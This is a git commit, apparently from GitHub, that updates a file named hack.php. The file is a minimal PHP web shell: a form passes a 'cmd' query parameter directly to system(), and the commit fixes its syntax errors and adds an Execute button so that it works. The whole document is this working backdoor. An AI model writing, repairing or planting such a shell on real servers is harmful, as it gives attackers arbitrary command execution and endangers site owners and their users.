79567c7e81475f91e75f64cc57d3c2cc051fa94b
Judy <142699800+Jo0dY@users.noreply.github.com>
2023-11-20 23:17:20 +0900

    Update hack.php

--- hack.php
+++ hack.php
@@ -2,12 +2,13 @@
 <body>
 <form method="GET" name ="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type = "TEXT" name="cmd" autofocus id="cmd" size ="80">
+<input type = "SUBMIT" value="Execute">
 </form>
 <pre>
 <?php
-	if(isset($_GET['cmd]))
+	if(isset($_GET['cmd']))
 {
-	system($_GET['cmd']));
+	system($_GET['cmd']);
 }
 
 ?>
